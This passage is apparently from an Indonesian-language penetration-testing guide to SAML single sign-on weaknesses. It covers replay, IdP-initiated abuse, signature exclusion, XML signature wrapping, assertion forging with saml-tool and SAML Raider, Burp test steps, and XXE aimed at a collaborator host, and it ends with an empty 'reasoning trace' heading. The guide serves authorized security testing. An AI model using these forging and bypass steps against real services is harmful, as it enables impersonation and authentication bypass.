| Recipient | Token untuk endpoint lain diterima |
| Destination | Idem, di level Response |
| InResponseTo | Replay & unsolicited injection |
| NotOnOrAfter | Replay jangka panjang |
| SubjectConfirmation Method | Bypass holder-of-key |

## Replay — Varian Operasional

- **Cache key lemah**: SP menyimpan ID assertion di cache dengan TTL = `NotOnOrAfter` tapi key hanya `AssertionID` tanpa issuer → tabrakan antar IdP.
- **Race condition**: kirim 2 request paralel dengan assertion sama; cache check non-atomic → dua sesi terbentuk.
- **Replay lintas protokol**: assertion SAML Web SSO dipakai di endpoint SAML Artifact atau di flow berbeda (SP-initiated vs IdP-initiated) yang cache-nya terpisah.
- **Stateless SP**: SP tanpa replay cache sama sekali (banyak library default `validateReplay=false`). Konfirmasi via dua POST identik dalam <1 detik.

## IdP-Initiated Abuse

- **Unsolicited Response diterima**: SP tidak memverifikasi `InResponseTo` → attacker dengan akses ke IdP sah (atau IdP miliknya sendiri jika trust dikonfigurasi longgar) dapat menyuntik sesi ke user korban (login CSRF / session fixation).
- **Trust berdasarkan Issuer string**: SP memercayai `Issuer` tanpa memverifikasi signature terhadap cert Issuer tersebut (mis. multi-IdP dengan cert salah konfigurasi).
- **IdP-initiated + Deep link**: `RelayState` diteruskan ke redirect terbuka → open redirect + token leak.
- **Cross-IdP confusion**: SP terdaftar di banyak IdP; assertion dari IdP A dengan `Issuer` IdP B (jika signature A diterima karena bug key resolution).

## Matriks Per Produk / Versi (pola umum)

| Produk/Komponen | Pola rentan yang sering muncul |
|---|---|
| `python3-saml` (OneLogin) lama | Default tidak strict pada beberapa opsi (`wantAssertionsSigned` false) |
| `passport-saml` <2.x | Signature exclusion pada Response vs Assertion |
| `ruby-saml` <1.12 | XSW & comment truncation (CVE-2020-…) |
| Shibboleth SP lama | Audience/Recipient longgar di beberapa config |
| ADFS (versi lama) | IdP-initiated unsolicited + weak algorithm acceptance |
| Keycloak (config default) | `validateSignature` bisa off di client; audience mapper salah |
| Spring Security SAML | Konfigurasi `requireSignedAssertions` vs `requireSignedResponse` |
| SimpleSAMLphp | `validate.authnrequest` / metadata trust longgar |
| Salesforce/Okta (SP side) | Multi-ACS & RelayState open redirect historis |

(Cek CVE spesifik per versi sebelum klaim; tabel ini pola, bukan advisory.)

## Alat — Penggunaan Lanjutan (tanpa mengulang dasar)

**SAML Raider (Burp extension)**
- Tab *SAML Message Editor*: decode otomatis, edit lalu re-sign dengan cert uji.
- *Certificate* tab: import cert IdP target (dari metadata publik) untuk forge signature valid — krusial untuk uji signature exclusion vs wrapping.
- *Attack* menu: XSW klasik 1–8, signature stripping, signature faking (ganti cert), comment injection.
- Alur uji: intercept POST `/SAML/SSO` → Raider → *Attack* → pilih varian → forward → amati respons. Ulangi per varian, catat yang menghasilkan sesi.

**saml-tool (onelogin/python)**
- `saml-tool.py --decode` / `--encode` untuk assertion; `--logincache` untuk mengekstrak assertion tersimpan.
- Generate assertion palsu: `--generate --nameid=admin@x --audience=... --issuer=...` lalu re-sign dengan cert uji.
- Berguna untuk skrip massal (loop varian XSW + replay).

**Pendukung**: `xmlsec1` untuk verifikasi manual (`xmlsec1 --verify`), `xmllint` untuk cek well-formed & ID, Burp *Repeater* + *Turbo Intruder* untuk race replay.

## Langkah Burp Ringkas (yang belum tercakup)

1. **Baseline**: kirim assertion sah, catat cookie sesi yang terbentuk.
2. **Enumerasi field**: ubah `Audience`, `Recipient`, `Destination`, `InResponseTo`, `NotOnOrAfter` satu per satu; catat mana yang diabaikan (masih login).
3. **Signature exclusion**: hapus `<Signature>` di Assertion (pertahankan di Response), lalu sebaliknya.
4. **XSW**: jalankan varian Raider 1–8, forward, cek apakah sesi terbentuk dan identitas (NameID) milik attacker.
5. **Comment/encoding**: sisipkan `<!-- -->` dan CDATA di NameID/Audience; bandingkan hasil.
6. **Replay**: kirim ulang POST identik via Turbo Intruder (parallelisme 2–5) untuk uji race cache.
7. **IdP-initiated**: hapus `InResponseTo`, forward; jika diterima → unsolicited.
8. **XXE**: suntik di AttributeValue/metadata import, arahkan ke collaborator.
9. **Validasi akhir**: pastikan sesi hasil bypass benar-benar mengautentikasi sebagai target (bukan hanya redirect).

## Jebakan Operasional

- **Signature break karena whitespace**: editing via editor yang mengubah line ending/encoding merusak canonicalization — gunakan editor Raider atau re-sign dengan cert uji.
- **Cert uji vs cert target**: forge hanya valid jika SP memercayai cert yang dipakai; jika pinning ketat, fokus ke XSW/signature exclusion, bukan signature faking.
- **Base64 URL-safe vs standar**: beberapa SP hanya menerima varian tertentu; normalisasi sebelum decode.
- **Deflate vs base64 murni**: `SAMLRequest`/`SAMLResponse` kadang ter-deflate (HTTP-Redirect binding); salah decode → payload rusak.
- **Clock skew**: uji `NotOnOrAfter` dengan margin; skew server target bisa membuat varian "gagal" padahal hanya timing.
- **Rate limit & lockout**: replay dan brute varian bisa memicu lockout akun uji; pakai akun terpisah dan jeda.
- **Log yang membocorkan**: banyak SP log assertion penuh; cek log/idempotensi sebelum laporan (hindari klaim berlebih).
- **Multi-tenant**: uji lintas tenant; bug audience sering hanya muncul di konfigurasi tenant tertentu.
- **Regression vs bug baru**: catat versi produk; pola yang sama bisa sudah dipatch di rilis terbaru — validasi pada versi target sebelum klaim.

## Tabel Ringkas Dampak → Prioritas Uji

| Temuan | Dampak | Prioritas |
|---|---|---|
| Signature exclusion (Response only) | AUTH bypass penuh | Kritis |
| XSW (assertion swap) | AUTH bypass / impersonasi | Kritis |
| Audience/Recipient mismatch | Cross-tenant token reuse | Tinggi |
| Unsolicited IdP-initiated diterima | Login CSRF / fixation | Tinggi |
| Replay tanpa cache | Session takeover berulang | Tinggi |
| Comment truncation | Bypass validasi NameID | Sedang–Tinggi |
| XXE di AttributeValue/metadata | File read / SSRF / RCE chain | Tinggi |
| Algorithm lemah (SHA1/`none`) | Forge signature (jika key lemah) | Sedang |
| Clock skew lebar | Memperluas window replay | Rendah–Sedang |


---

## [reasoning trace]


